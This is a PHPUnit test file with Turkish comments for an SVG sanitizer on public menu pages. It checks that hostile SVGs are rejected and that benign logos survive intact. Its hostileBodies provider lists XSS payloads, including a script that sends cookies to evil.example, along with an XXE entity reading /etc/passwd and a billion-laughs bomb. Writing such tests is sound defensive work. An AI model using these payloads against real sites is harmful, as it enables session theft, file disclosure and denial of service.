<?php

declare(strict_types=1);

namespace Tests\Unit\Media;

use App\Domain\Media\SvgSanitizer;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

/**
 * SVG TEMİZLEYİCİSİ — sahibin 2026-09-05 kararının güvenlik yarısı
 * (`docs/108` §6.2, `docs/49` Faz 2 madde 6'nın yerine geçer).
 *
 * NEDEN BU TEST VAR. SVG bir görsel değil, bir BELGEDİR. Bir JPEG'in içinden
 * kod çalışmaz; bir SVG'nin içinden çalışır: `<script>`, `onload=`,
 * `javascript:` bağlantısı, `<foreignObject>` içinde HTML, harici `<use>`.
 * Menü sayfaları herkese AÇIK olduğu için temizlenmemiş bir SVG'yi kabul
 * etmek, misafirin telefonunda çalışacak kod yüklemeye izin vermektir
 * (stored XSS). Sahip "SVG'yi şimdi aç" dedi; bu dosya o kararın bedelinin
 * ödendiğinin kanıtıdır.
 *
 * Temizleyici SAF'tır: çerçeve bilmez, dosya sistemi bilmez, ağa çıkmaz.
 * Bu yüzden burada HTTP yok — girdi bir dize, çıktı bir karar.
 */
final class SvgSanitizerTest extends TestCase
{
    private function sanitizer(): SvgSanitizer
    {
        return new SvgSanitizer;
    }

    private const NS = 'xmlns="http://www.w3.org/2000/svg"';

    // --- Saldırı gövdeleri: hiçbiri güvenli sayılmaz ------------------------

    /**
     * @return array<string, array{0:string}>
     */
    public static function hostileBodies(): array
    {
        $ns = 'xmlns="http://www.w3.org/2000/svg"';
        $xlink = 'xmlns:xlink="http://www.w3.org/1999/xlink"';

        return [
            // Klasik: gövdeye gömülü betik. Misafir menüyü açtığında çalışır.
            'script elementi' => ['<svg '.$ns.'><script>fetch("https://evil.example/"+document.cookie)</script></svg>'],
            // Betik etiketi olmadan da olur: olay özniteliği yeter.
            'onload özniteliği' => ['<svg '.$ns.' onload="alert(1)"><rect width="10" height="10"/></svg>'],
            'onclick özniteliği' => ['<svg '.$ns.'><rect width="10" height="10" onclick="alert(1)"/></svg>'],
            // Bağlantı protokolü de bir yürütme yoludur.
            'javascript: bağlantısı' => ['<svg '.$ns.' '.$xlink.'><a xlink:href="javascript:alert(1)"><rect width="10" height="10"/></a></svg>'],
            // Harici `use`: sunucumuzun servis ettiği belge, başkasının
            // belgesini içeri çeker; içeriği bizim denetimimizde değildir.
            'harici use' => ['<svg '.$ns.' '.$xlink.'><use xlink:href="https://evil.example/p.svg#x"/></svg>'],
            // `foreignObject` SVG'nin içine HTML açar — yani tam bir sayfa.
            'foreignObject' => ['<svg '.$ns.'><foreignObject width="10" height="10"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>'],
            'iframe' => ['<svg '.$ns.'><iframe src="https://evil.example/"/></svg>'],
            // Animasyon ögeleri olay tetikleyebilir ve öznitelik değiştirebilir.
            'animate ile öznitelik değiştirme' => ['<svg '.$ns.' '.$xlink.'><a><animate attributeName="xlink:href" values="javascript:alert(1)"/><rect width="10" height="10"/></a></svg>'],
            'set ile öznitelik değiştirme' => ['<svg '.$ns.'><rect width="10" height="10"><set attributeName="fill" to="red"/></rect></svg>'],
            // Dış kaynak: stil dosyası da bir kanaldır (ve bir iz bırakıcıdır).
            'style içinde @import' => ['<svg '.$ns.'><style>@import url("https://evil.example/x.css");</style><rect width="10" height="10"/></svg>'],
            'style içinde harici url()' => ['<svg '.$ns.'><rect width="10" height="10" style="fill:url(https://evil.example/x.svg#g)"/></svg>'],
            // Sunum özniteliğinden de dışarı çıkılır.
            'fill özniteliğinde harici url()' => ['<svg '.$ns.'><rect width="10" height="10" fill="url(https://evil.example/x.svg#g)"/></svg>'],
            // XXE: sunucunun kendi dosyasını okutma.
            'XXE — harici varlık' => ['<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg '.$ns.'><text>&xxe;</text></svg>'],
            // Milyar gülüş: küçük dosya, sınırsız bellek.
            'milyar gülüş' => ['<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><svg '.$ns.'><text>&lol3;</text></svg>'],
        ];
    }

    #[DataProvider('hostileBodies')]
    public function test_a_hostile_body_is_never_reported_as_safe(string $body): void
    {
        $result = $this->sanitizer()->sanitize($body);

        self::assertFalse(
            $result->isSafe(),
            'Bu gövde güvenli sayıldı; oysa içinde çalışabilir ya da dışarı '
            .'çıkan bir şey var. Kabul edilseydi menüyü açan misafirin '
            .'telefonunda çalışırdı.',
        );
        self::assertNotSame([], $result->threats, 'Reddedildi ama SEBEBİ yazılmadı; sahip ne yapacağını bilemez.');
        self::assertNotNull($result->failureReason);
    }

    #[DataProvider('hostileBodies')]
    public function test_a_hostile_body_never_leaves_its_payload_in_the_sanitized_output(string $body): void
    {
        $sanitized = (string) $this->sanitizer()->sanitize($body)->sanitized;

        // Gövde reddedilir; yine de temizleyicinin ÜRETTİĞİ dize (varsa)
        // saldırıyı taşımamalı. Tek bir savunma hattına yaslanılmaz.
        foreach (['<script', 'onload=', 'onclick=', 'javascript:', 'evil.example', '<foreignObject', '<iframe', '@import'] as $needle) {
            self::assertStringNotContainsStringIgnoringCase($needle, $sanitized);
        }
    }

    // --- Zararsız SVG bozulmadan geçer -------------------------------------

    public function test_a_harmless_logo_passes_through_intact(): void
    {
        $body = '<svg '.self::NS.' viewBox="0 0 512 512" width="512" height="512">'
            .'<title>Zeytin</title>'
            .'<defs><linearGradient id="g"><stop offset="0" stop-color="#0a0"/><stop offset="1" stop-color="#060"/></linearGradient></defs>'
            .'<path d="M10 10 L120 10 L120 120 Z" fill="url(#g)" stroke="#000" stroke-width="2"/>'
            .'<circle cx="64" cy="64" r="32" fill="#fff" opacity="0.8"/>'
            .'<g transform="translate(4,4)"><rect x="1" y="2" width="8" height="9" rx="2"/></g>'
            .'</svg>';

        $result = $this->sanitizer()->sanitize($body);

        self::assertTrue($result->isSafe(), 'Temizleyici işini abartıyor: zararsız bir logo reddedildi.');

        $out = (string) $result->sanitized;

        // Çizimin kendisi hayatta kalmalı; yoksa "temizleyici" değil,
        // "silici" olur ve sahip logosunu tanıyamaz.
        self::assertStringContainsString('M10 10 L120 10 L120 120 Z', $out);
        self::assertStringContainsString('viewBox="0 0 512 512"', $out);
        self::assertStringContainsString('url(#g)', $out, 'İÇ referans (gradient) kesildi.');
        self::assertStringContainsString('<circle', $out);
        self::assertStringContainsString('transform="translate(4,4)"', $out);
        self::assertStringContainsString('stroke-width="2"', $out);
    }

    public function test_an_internal_use_reference_is_allowed(): void
    {
        $body = '<svg '.self::NS.'><defs><rect id="r" width="4" height="4"/></defs><use href="#r"/></svg>';

        $result = $this->sanitizer()->sanitize($body);

        self::assertTrue($result->isSafe(), 'İç referanslı `use` yasaklandı; oysa dışarı çıkmıyor.');
        self::assertStringContainsString('href="#r"', (string) $result->sanitized);
    }

    // --- Çıktı yalnız DARALIR ----------------------------------------------

    public function test_the_output_only_ever_narrows_the_input(): void
    {
        $body = '<svg '.self::NS.' viewBox="0 0 10 10">'
            .'<!-- editör yorumu -->'
            .'<metadata>rdf</metadata>'
            .'<rect width="10" height="10" fill="#123456" onmouseover="x()"/>'
            .'<script>x()</script>'
            .'</svg>';

        $out = (string) $this->sanitizer()->sanitize($body)->sanitized;

        // BU testin sözü şudur: temizleyici asla İÇERİK EKLEMEZ. Ekleyen bir
        // temizleyici, denetlenemez bir şey olur — çıktısına neyin nereden
        // geldiği artık bilinemez.
        foreach ($this->elementNames($out) as $element) {
            self::assertContains($element, $this->elementNames($body), "Çıktıda girdide olmayan `<{$element}>` var.");
        }

        foreach ($this->attributeNames($out) as $attribute) {
            self::assertContains($attribute, $this->attributeNames($body), "Çıktıda girdide olmayan `{$attribute}` özniteliği var.");
        }
    }

    // --- Ayrıştırılamayan / SVG olmayan gövde reddedilir (fail-closed) ------

    /**
     * @return array<string, array{0:string}>
     */
    public static function unreadableBodies(): array
    {
        return [
            'boş' => [''],
            'yalnız boşluk' => ["  \n\t "],
            'kapanmamış etiket' => ['<svg xmlns="http://www.w3.org/2000/svg"><g><rect/></svg>'],
            'XML değil' => ['bu düpedüz metin'],
            'SVG değil — HTML' => ['<html xmlns="http://www.w3.org/1999/xhtml"><body>merhaba</body></html>'],
            'ad alanı yok' => ['<svg><rect width="10" height="10"/></svg>'],
        ];
    }

    #[DataProvider('unreadableBodies')]
    public function test_an_unreadable_body_is_rejected_with_a_reason(string $body): void
    {
        $result = $this->sanitizer()->sanitize($body);

        // FAIL-CLOSED: anlamadığımız bir gövdeyi "herhalde iyidir" diye
        // geçirmek, tam da anlamadığımız için tehlikelidir.
        self::assertFalse($result->isSafe());
        self::assertNotNull($result->failureReason, 'Ret sebebi yazılmadı.');
    }

    public function test_an_absurdly_deep_document_is_rejected_instead_of_exhausting_the_server(): void
    {
        // Küçük bir dosya, çok sayıda düğüm: temizleyicinin kendisi bir
        // hizmet-dışı bırakma aracına dönüşmemeli. Piksel tavanının
        // (`media-slots.limits.max_megapixels`) SVG karşılığı budur.
        $body = '<svg '.self::NS.'>'.str_repeat('<g/>', SvgSanitizer::MAX_ELEMENTS + 10).'</svg>';

        self::assertFalse($this->sanitizer()->sanitize($body)->isSafe());
    }

    // --- yardımcılar --------------------------------------------------------

    /** @return list<string> */
    private function elementNames(string $markup): array
    {
        preg_match_all('/<\s*([a-zA-Z][a-zA-Z0-9:_-]*)/', $markup, $matches);

        return array_values(array_unique(array_map('strtolower', $matches[1])));
    }

    /** @return list<string> */
    private function attributeNames(string $markup): array
    {
        preg_match_all('/([a-zA-Z][a-zA-Z0-9:_-]*)\s*=\s*"/', $markup, $matches);

        return array_values(array_unique(array_map('strtolower', $matches[1])));
    }
}
